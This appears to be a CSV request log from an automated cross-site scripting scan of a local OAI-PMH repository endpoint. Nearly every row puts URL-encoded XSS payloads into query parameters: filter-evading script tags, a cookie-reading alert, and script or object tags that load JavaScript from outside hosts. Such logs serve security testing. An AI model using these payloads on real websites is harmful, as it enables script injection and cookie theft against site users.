uuid,timestamp,http_status_code,request_url,response_time,http_version
39b760cc-747a-42af-89c9-887cc318406a,2025-01-02 03:25:59,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc,2114.98 ms,HTTP/1.1
2432350d-aae1-4d34-90b5-28e60d6a900c,2025-01-02 03:26:02,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&set=%3Cobject+type%3D%22text%2Fx-scriptlet%22+data%3D%22http%3A%2F%2Fjsfiddle.net%2FXLE63%2F+%22%3E%3C%2Fobject%3E,2154.35 ms,HTTP/1.1
af7c65ad-2522-4113-80ea-35196e72a7ed,2025-01-02 03:26:04,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cobject+type%3D%22text%2Fx-scriptlet%22+data%3D%22http%3A%2F%2Fjsfiddle.net%2FXLE63%2F+%22%3E%3C%2Fobject%3E&metadataPrefix=marc,2133.20 ms,HTTP/1.1
62d63ea1-eca7-4e2a-b586-3cf7f66e802a,2025-01-02 03:26:07,403,http://localhost:8081/oai/request?verb=%3CsCR%3Cscript%3EiPt%3Ealert%281%29%3C%2FSCr%3C%2Fscript%3EIPt%3E,2084.22 ms,HTTP/1.1
de6d1445-8aac-489f-9fbd-9f958bbcb986,2025-01-02 03:26:09,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3CsCR%3Cscript%3EiPt%3Ealert%281%29%3C%2FSCr%3C%2Fscript%3EIPt%3E,2141.47 ms,HTTP/1.1
3de8d99d-b761-4779-b58c-fc5229581267,2025-01-02 03:26:11,200,http://localhost:8081/oai/request?verb=ListSets,2124.86 ms,HTTP/1.1
68e701cb-bfc9-48ca-a9f8-c2ca044e4f80,2025-01-02 03:26:14,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3CsCR%3Cscript%3EiPt%3Ealert%281%29%3C%2FSCr%3C%2Fscript%3EIPt%3E,2084.13 ms,HTTP/1.1
aa0559ff-12aa-4c77-b455-d9479bc89c12,2025-01-02 03:26:16,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3CsCR%3Cscript%3EiPt%3Ealert%281%29%3C%2FSCr%3C%2Fscript%3EIPt%3E&until=%3CsCR%3Cscript%3EiPt%3Ealert%281%29%3C%2FSCr%3C%2Fscript%3EIPt%3E&set=%3CsCR%3Cscript%3EiPt%3Ealert%281%29%3C%2FSCr%3C%2Fscript%3EIPt%3E,2151.47 ms,HTTP/1.1
81f0744a-8750-4784-90bc-72dde9d528d7,2025-01-02 03:26:19,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CsCR%3Cscript%3EiPt%3Ealert%281%29%3C%2FSCr%3C%2Fscript%3EIPt%3E&metadataPrefix=marc,2132.33 ms,HTTP/1.1
2316ad43-0e89-49d3-a691-157728707eb2,2025-01-02 03:26:21,403,http://localhost:8081/oai/request?verb=%3CsVg%3E%3CscRipt+%2500%3Ealert%26lpar%3B1%26rpar%3B+%7BOpera%7D,2074.19 ms,HTTP/1.1
ee7ed1b4-2a05-4328-a64f-2be09adc62f8,2025-01-02 03:26:23,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3CsVg%3E%3CscRipt+%2500%3Ealert%26lpar%3B1%26rpar%3B+%7BOpera%7D,2131.58 ms,HTTP/1.1
06611de1-0524-44ff-8e6f-e6b117ee2edb,2025-01-02 03:26:26,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3CsVg%3E%3CscRipt+%2500%3Ealert%26lpar%3B1%26rpar%3B+%7BOpera%7D,2103.41 ms,HTTP/1.1
9ada8901-a7e3-4f64-8c03-9c7dca731ad0,2025-01-02 03:26:28,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc,2121.09 ms,HTTP/1.1
6f76317c-7a4c-4853-934c-54d3150e4763,2025-01-02 03:26:31,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3CsVg%3E%3CscRipt+%2500%3Ealert%26lpar%3B1%26rpar%3B+%7BOpera%7D&until=%3CsVg%3E%3CscRipt+%2500%3Ealert%26lpar%3B1%26rpar%3B+%7BOpera%7D,2160.85 ms,HTTP/1.1
e4810cb6-0f09-4459-b06a-a283465d0f59,2025-01-02 03:26:33,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CsVg%3E%3CscRipt+%2500%3Ealert%26lpar%3B1%26rpar%3B+%7BOpera%7D&metadataPrefix=oai_dc,2135.75 ms,HTTP/1.1
b872c739-61aa-4bd6-a0ac-ed509c44daec,2025-01-02 03:26:35,403,http://localhost:8081/oai/request?verb=%3CsVg%3E%3CscRipt+%3Ealert%26lpar%3B1%26rpar%3B+%7BOpera%7D,2087.01 ms,HTTP/1.1
729e8fa5-8ca1-46ea-a372-c25084347a1d,2025-01-02 03:26:38,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2138.13 ms,HTTP/1.1
946d61b6-bde1-4bb9-a67d-be83ec02f423,2025-01-02 03:26:40,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3CsVg%3E%3CscRipt+%3Ealert%26lpar%3B1%26rpar%3B+%7BOpera%7D,2130.58 ms,HTTP/1.1
4008ad4b-f3a0-4df0-aa25-f11115a8f8d8,2025-01-02 03:26:43,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%3CsVg%3E%3CscRipt+%3Ealert%26lpar%3B1%26rpar%3B+%7BOpera%7D,2165.02 ms,HTTP/1.1
40c3fa54-22ca-4139-a2b8-5fb5aaa9a634,2025-01-02 03:26:45,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3CsVg%3E%3CscRipt+%3Ealert%26lpar%3B1%26rpar%3B+%7BOpera%7D&until=%3CsVg%3E%3CscRipt+%3Ealert%26lpar%3B1%26rpar%3B+%7BOpera%7D&set=%3CsVg%3E%3CscRipt+%3Ealert%26lpar%3B1%26rpar%3B+%7BOpera%7D,2129.73 ms,HTTP/1.1
ff35d2d2-ae74-40b0-a845-d40363f80582,2025-01-02 03:26:47,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CsVg%3E%3CscRipt+%3Ealert%26lpar%3B1%26rpar%3B+%7BOpera%7D&metadataPrefix=oai_dc,2096.06 ms,HTTP/1.1
634a8c5a-bafc-41ba-9e8d-abaf381c2b1d,2025-01-02 03:26:50,403,http://localhost:8081/oai/request?verb=%3Cscr%3Cscript%3Eipt%3Ealert%28%27XSS%27%29%3B%3C%2Fscr%3C%2Fscript%3Eipt%3E,2073.23 ms,HTTP/1.1
c7838deb-3c24-4797-bd7b-667bc2f5733e,2025-01-02 03:26:52,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Cscr%3Cscript%3Eipt%3Ealert%28%27XSS%27%29%3B%3C%2Fscr%3C%2Fscript%3Eipt%3E,2133.82 ms,HTTP/1.1
04bfbef1-0f11-47ed-b00f-32c8d84417d6,2025-01-02 03:26:55,200,http://localhost:8081/oai/request?verb=ListSets,2126.37 ms,HTTP/1.1
2684680b-f31c-4020-892b-86ef9424df8f,2025-01-02 03:26:57,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3Cscr%3Cscript%3Eipt%3Ealert%28%27XSS%27%29%3B%3C%2Fscr%3C%2Fscript%3Eipt%3E,2152.24 ms,HTTP/1.1
83b42233-b950-4f14-870e-0d752c6b3e88,2025-01-02 03:26:59,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3Cscr%3Cscript%3Eipt%3Ealert%28%27XSS%27%29%3B%3C%2Fscr%3C%2Fscript%3Eipt%3E&set=%3Cscr%3Cscript%3Eipt%3Ealert%28%27XSS%27%29%3B%3C%2Fscr%3C%2Fscript%3Eipt%3E,2140.25 ms,HTTP/1.1
d7d499be-c237-4b7f-9a71-2d3acbaa4bc8,2025-01-02 03:27:02,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cscr%3Cscript%3Eipt%3Ealert%28%27XSS%27%29%3B%3C%2Fscr%3C%2Fscript%3Eipt%3E&metadataPrefix=oai_dc,2143.41 ms,HTTP/1.1
e03a18e3-30fe-4c9b-87f7-f95e28f91293,2025-01-02 03:27:04,403,http://localhost:8081/oai/request?verb=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E,2073.66 ms,HTTP/1.1
fe5d9f65-439b-442b-b275-e706aaf6abaf,2025-01-02 03:27:07,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2097.09 ms,HTTP/1.1
5b0f2139-41c4-4b29-8240-b3c08d7ef4f6,2025-01-02 03:27:09,200,http://localhost:8081/oai/request?verb=ListSets,2079.97 ms,HTTP/1.1
c2613162-ebfb-4d50-9229-2504b9dca1f6,2025-01-02 03:27:11,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc,2114.57 ms,HTTP/1.1
d4814d16-8cc0-4a5f-a3e7-95154246151c,2025-01-02 03:27:14,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&set=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E,2140.43 ms,HTTP/1.1
9a02b1d9-a9ac-4cc6-b7b4-6c0d16b0e4ef,2025-01-02 03:27:16,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E&metadataPrefix=marc,2117.03 ms,HTTP/1.1
8a1b6392-dd08-414d-9ad3-9749f2caf3c7,2025-01-02 03:27:18,403,http://localhost:8081/oai/request?verb=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E,2058.77 ms,HTTP/1.1
6bb86f8e-7d5e-4136-9bf3-3ab111cc521d,2025-01-02 03:27:21,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E,2149.51 ms,HTTP/1.1
da8d982f-3373-4f96-918e-c0de08e82255,2025-01-02 03:27:23,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E,2148.77 ms,HTTP/1.1
4edd3ea8-9eae-41fe-b085-840ef5e3d53a,2025-01-02 03:27:26,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E,2133.50 ms,HTTP/1.1
a1d6f339-0093-459a-8470-eb6edadd0799,2025-01-02 03:27:28,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&set=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E,2169.56 ms,HTTP/1.1
f710fa19-568d-417b-a5ad-f46b79f2fb1c,2025-01-02 03:27:31,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E&metadataPrefix=oai_dc,2114.91 ms,HTTP/1.1
b745dc98-f0a1-4252-bedd-6a8189d4383a,2025-01-02 03:27:33,403,http://localhost:8081/oai/request?verb=%3Cscr%3Cscript%3Eipt%3Ealert%28document.cookie%29%3C%2Fscr%3C%2Fscript%3Eipt%3E,2085.12 ms,HTTP/1.1
a0a476bd-61ea-48e9-83bd-6404606fe014,2025-01-02 03:27:35,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Cscr%3Cscript%3Eipt%3Ealert%28document.cookie%29%3C%2Fscr%3C%2Fscript%3Eipt%3E,2114.84 ms,HTTP/1.1
04b31b52-6db8-4fb5-a3b0-c6bb93a3505e,2025-01-02 03:27:38,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3Cscr%3Cscript%3Eipt%3Ealert%28document.cookie%29%3C%2Fscr%3C%2Fscript%3Eipt%3E,2119.12 ms,HTTP/1.1
57314bd0-0167-4149-9d46-aa7534196f6e,2025-01-02 03:27:40,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%3Cscr%3Cscript%3Eipt%3Ealert%28document.cookie%29%3C%2Fscr%3C%2Fscript%3Eipt%3E,2111.12 ms,HTTP/1.1
a551ee43-ad1f-47af-9a3f-5e1e37a143b3,2025-01-02 03:27:43,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Cscr%3Cscript%3Eipt%3Ealert%28document.cookie%29%3C%2Fscr%3C%2Fscript%3Eipt%3E&until=%3Cscr%3Cscript%3Eipt%3Ealert%28document.cookie%29%3C%2Fscr%3C%2Fscript%3Eipt%3E&set=%3Cscr%3Cscript%3Eipt%3Ealert%28document.cookie%29%3C%2Fscr%3C%2Fscript%3Eipt%3E,2138.60 ms,HTTP/1.1
890c3f19-9314-445b-8e85-561f85752d85,2025-01-02 03:27:45,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cscr%3Cscript%3Eipt%3Ealert%28document.cookie%29%3C%2Fscr%3C%2Fscript%3Eipt%3E&metadataPrefix=marc,2127.71 ms,HTTP/1.1
1bfc314d-11b8-4463-8035-9b7b5e22a1d2,2025-01-02 03:27:47,403,http://localhost:8081/oai/request?verb=%3Cscript+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.js%22%3E%3C%2Fscript%3E,2077.16 ms,HTTP/1.1
4deeeca5-aeb2-451c-81f0-6e768c7b59da,2025-01-02 03:27:50,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Cscript+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.js%22%3E%3C%2Fscript%3E,2146.35 ms,HTTP/1.1
1f441d3c-4291-4113-bbaf-50e08e69e770,2025-01-02 03:27:52,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3Cscript+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.js%22%3E%3C%2Fscript%3E,2131.95 ms,HTTP/1.1
ee6d4ea3-b8e3-44ac-b2c9-37e5198f2df0,2025-01-02 03:27:55,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Cscript+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.js%22%3E%3C%2Fscript%3E&until=%3Cscript+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.js%22%3E%3C%2Fscript%3E&set=%3Cscript+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.js%22%3E%3C%2Fscript%3E,2115.16 ms,HTTP/1.1
3971ebb9-66b6-4975-ae05-69306ec0eb97,2025-01-02 03:27:57,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&set=%3Cscript+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.js%22%3E%3C%2Fscript%3E,2128.37 ms,HTTP/1.1
0ee9d513-8aac-44da-bfdb-e1c68e5cb8e3,2025-01-02 03:27:59,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cscript+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.js%22%3E%3C%2Fscript%3E&metadataPrefix=marc,2169.81 ms,HTTP/1.1
45c7e896-d3d0-47e5-9732-4bc32d16e3b6,2025-01-02 03:28:02,403,http://localhost:8081/oai/request?verb=%3Cscript+%2F%2A%2500%2A%2F%3E%2F%2A%2500%2A%2Falert%281%29%2F%2A%2500%2A%2F%3C%2Fscript+%2F%2A%2500%2A%2F,2072.41 ms,HTTP/1.1
b3ba6778-8caa-4da6-8709-6739cf330668,2025-01-02 03:28:04,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2104.90 ms,HTTP/1.1
e640061d-61b5-4596-9e82-da34f1d9101e,2025-01-02 03:28:06,200,http://localhost:8081/oai/request?verb=ListSets,2081.22 ms,HTTP/1.1
e4847ce8-1508-43c2-8874-4dd1538f71d1,2025-01-02 03:28:09,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Cscript+%2F%2A%2500%2A%2F%3E%2F%2A%2500%2A%2Falert%281%29%2F%2A%2500%2A%2F%3C%2Fscript+%2F%2A%2500%2A%2F&until=%3Cscript+%2F%2A%2500%2A%2F%3E%2F%2A%2500%2A%2Falert%281%29%2F%2A%2500%2A%2F%3C%2Fscript+%2F%2A%2500%2A%2F&set=%3Cscript+%2F%2A%2500%2A%2F%3E%2F%2A%2500%2A%2Falert%281%29%2F%2A%2500%2A%2F%3C%2Fscript+%2F%2A%2500%2A%2F,2108.92 ms,HTTP/1.1
3fbae6e6-bd32-4acb-9cd0-ff2cacf3d989,2025-01-02 03:28:11,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3Cscript+%2F%2A%2500%2A%2F%3E%2F%2A%2500%2A%2Falert%281%29%2F%2A%2500%2A%2F%3C%2Fscript+%2F%2A%2500%2A%2F,2144.34 ms,HTTP/1.1
330d5843-fca1-4485-a667-a7081c4b3a3b,2025-01-02 03:28:14,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cscript+%2F%2A%2500%2A%2F%3E%2F%2A%2500%2A%2Falert%281%29%2F%2A%2500%2A%2F%3C%2Fscript+%2F%2A%2500%2A%2F&metadataPrefix=oai_dc,2115.28 ms,HTTP/1.1
797e7b74-0e43-462f-90ec-0d2945f3c979,2025-01-02 03:28:16,403,http://localhost:8081/oai/request?verb=%3Cscript+%2F%2A%2A%2A%2F%3E%2F%2A%2A%2A%2Fconfirm%28%27%5CuFF41%5CuFF4C%5CuFF45%5CuFF52%5CuFF54%5Cu1455%5CuFF11%5Cu1450%27%29%2F%2A%2A%2A%2F%3C%2Fscript+%2F%2A%2A%2A%2F,2057.20 ms,HTTP/1.1
c8ab7a43-ddb7-49da-90f4-a95c856abb4a,2025-01-02 03:28:18,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2131.14 ms,HTTP/1.1
8d4add23-e786-4776-b22e-e806db753e6b,2025-01-02 03:28:21,200,http://localhost:8081/oai/request?verb=ListSets,2128.72 ms,HTTP/1.1
4d3b2eaa-922b-42fb-b26a-a56c6a56a518,2025-01-02 03:28:23,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Cscript+%2F%2A%2A%2A%2F%3E%2F%2A%2A%2A%2Fconfirm%28%27%5CuFF41%5CuFF4C%5CuFF45%5CuFF52%5CuFF54%5Cu1455%5CuFF11%5Cu1450%27%29%2F%2A%2A%2A%2F%3C%2Fscript+%2F%2A%2A%2A%2F&until=%3Cscript+%2F%2A%2A%2A%2F%3E%2F%2A%2A%2A%2Fconfirm%28%27%5CuFF41%5CuFF4C%5CuFF45%5CuFF52%5CuFF54%5Cu1455%5CuFF11%5Cu1450%27%29%2F%2A%2A%2A%2F%3C%2Fscript+%2F%2A%2A%2A%2F&set=%3Cscript+%2F%2A%2A%2A%2F%3E%2F%2A%2A%2A%2Fconfirm%28%27%5CuFF41%5CuFF4C%5CuFF45%5CuFF52%5CuFF54%5Cu1455%5CuFF11%5Cu1450%27%29%2F%2A%2A%2A%2F%3C%2Fscript+%2F%2A%2A%2A%2F,2120.03 ms,HTTP/1.1
b8256d9f-77b2-46a9-9ceb-7b1697c67254,2025-01-02 03:28:26,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3Cscript+%2F%2A%2A%2A%2F%3E%2F%2A%2A%2A%2Fconfirm%28%27%5CuFF41%5CuFF4C%5CuFF45%5CuFF52%5CuFF54%5Cu1455%5CuFF11%5Cu1450%27%29%2F%2A%2A%2A%2F%3C%2Fscript+%2F%2A%2A%2A%2F,2127.42 ms,HTTP/1.1
de8ba330-4c9a-4382-a962-2ddde35e4c04,2025-01-02 03:28:28,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cscript+%2F%2A%2A%2A%2F%3E%2F%2A%2A%2A%2Fconfirm%28%27%5CuFF41%5CuFF4C%5CuFF45%5CuFF52%5CuFF54%5Cu1455%5CuFF11%5Cu1450%27%29%2F%2A%2A%2A%2F%3C%2Fscript+%2F%2A%2A%2A%2F&metadataPrefix=marc,2080.08 ms,HTTP/1.1
d3cc04bc-cda8-4cde-9b4d-b686e87cbb7c,2025-01-02 03:28:30,403,http://localhost:8081/oai/request?verb=%3Cscript+%2F%2A%2A%2F%3E%2F%2A%2A%2Falert%281%29%2F%2A%2A%2F%3C%2Fscript+%2F%2A%2A%2F,2071.78 ms,HTTP/1.1
efdaf163-39ca-44c1-8a54-021c9f98eac2,2025-01-02 03:28:33,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Cscript+%2F%2A%2A%2F%3E%2F%2A%2A%2Falert%281%29%2F%2A%2A%2F%3C%2Fscript+%2F%2A%2A%2F,2127.83 ms,HTTP/1.1
2ff981ed-1d24-4a4e-9c5b-fa4a3a728e7d,2025-01-02 03:28:35,200,http://localhost:8081/oai/request?verb=ListSets,2117.07 ms,HTTP/1.1
7c560f5a-53d0-4c6f-92cd-8489c6d8d0ac,2025-01-02 03:28:38,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Cscript+%2F%2A%2A%2F%3E%2F%2A%2A%2Falert%281%29%2F%2A%2A%2F%3C%2Fscript+%2F%2A%2A%2F,2163.17 ms,HTTP/1.1
872d3ff7-8dd6-4982-95a8-5672c65bcd20,2025-01-02 03:28:40,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc,2122.81 ms,HTTP/1.1
841e562d-b306-49d3-9862-0ab828c360fa,2025-01-02 03:28:42,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cscript+%2F%2A%2A%2F%3E%2F%2A%2A%2Falert%281%29%2F%2A%2A%2F%3C%2Fscript+%2F%2A%2A%2F&metadataPrefix=marc,2138.89 ms,HTTP/1.1
fcbf56f4-2a04-49f7-8c66-3adccf410458,2025-01-02 03:28:45,403,http://localhost:8081/oai/request?verb=%3Cscript+%3CB%3Edocument.vulnerable%3Dtrue%3B%3C%2Fscript%3E,2064.37 ms,HTTP/1.1
49fbcb60-faa8-4fac-b872-170028530eec,2025-01-02 03:28:47,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Cscript+%3CB%3Edocument.vulnerable%3Dtrue%3B%3C%2Fscript%3E,2119.16 ms,HTTP/1.1
17f9fef6-d9d9-4c28-8c38-af864ee207ef,2025-01-02 03:28:50,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3Cscript+%3CB%3Edocument.vulnerable%3Dtrue%3B%3C%2Fscript%3E,2163.42 ms,HTTP/1.1
e02e374d-a9b6-41b0-810c-99104e012943,2025-01-02 03:28:52,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3Cscript+%3CB%3Edocument.vulnerable%3Dtrue%3B%3C%2Fscript%3E,2117.32 ms,HTTP/1.1
bccbf093-e05a-4f31-ab1c-a973a446ac10,2025-01-02 03:28:54,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Cscript+%3CB%3Edocument.vulnerable%3Dtrue%3B%3C%2Fscript%3E&until=%3Cscript+%3CB%3Edocument.vulnerable%3Dtrue%3B%3C%2Fscript%3E&set=%3Cscript+%3CB%3Edocument.vulnerable%3Dtrue%3B%3C%2Fscript%3E,2134.15 ms,HTTP/1.1
43dc0c49-18a0-463f-b8eb-ac43637fc7bf,2025-01-02 03:28:57,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cscript+%3CB%3Edocument.vulnerable%3Dtrue%3B%3C%2Fscript%3E&metadataPrefix=marc,2146.62 ms,HTTP/1.1
6276368b-eaf6-4dcc-8428-78e37fc04151,2025-01-02 03:28:59,403,http://localhost:8081/oai/request?verb=%3Cscript+%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.js%22%3E%3C%2Fscript%3E,2065.92 ms,HTTP/1.1
5236e0f8-158d-4573-b5bb-8d9357f16c8d,2025-01-02 03:29:02,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Cscript+%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.js%22%3E%3C%2Fscript%3E,2119.41 ms,HTTP/1.1
d5ec0f51-973c-418c-9ef6-2d747dfd3a6c,2025-01-02 03:29:04,200,http://localhost:8081/oai/request?verb=ListSets,2120.05 ms,HTTP/1.1
e5a6334e-35cc-4a3f-a762-9be985f0f4eb,2025-01-02 03:29:06,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3Cscript+%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.js%22%3E%3C%2Fscript%3E&set=%3Cscript+%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.js%22%3E%3C%2Fscript%3E,2107.22 ms,HTTP/1.1
d9043ba6-a63f-4f42-8dd2-da8a3b199fa4,2025-01-02 03:29:09,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Cscript+%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.js%22%3E%3C%2Fscript%3E&until=%3Cscript+%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.js%22%3E%3C%2Fscript%3E,2133.08 ms,HTTP/1.1
086e1fb6-294b-4e44-9d7f-c22dd52b619a,2025-01-02 03:29:11,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cscript+%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.js%22%3E%3C%2Fscript%3E&metadataPrefix=marc,2148.35 ms,HTTP/1.1
7de1ab78-ee2f-43a4-97fd-a8a5fff69e82,2025-01-02 03:29:13,403,http://localhost:8081/oai/request?verb=%3Cscript+SRC%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.jpg%22%3E%3C%2Fscript%3E,2089.49 ms,HTTP/1.1
e9559245-103d-42b0-b669-0f88b3a57b2e,2025-01-02 03:29:16,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Cscript+SRC%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.jpg%22%3E%3C%2Fscript%3E,2134.68 ms,HTTP/1.1
